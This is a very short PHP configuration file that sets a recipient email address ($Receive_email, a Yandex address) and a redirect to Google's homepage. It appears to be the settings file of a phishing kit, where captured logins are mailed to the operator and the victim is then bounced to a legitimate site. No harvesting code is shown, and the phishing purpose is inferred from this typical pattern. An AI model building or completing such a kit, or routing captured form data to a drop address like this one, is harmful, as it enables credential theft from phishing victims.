<?php 
$Receive_email="mohandas.mair@yandex.com";
$redirect="https://www.google.com/";
?>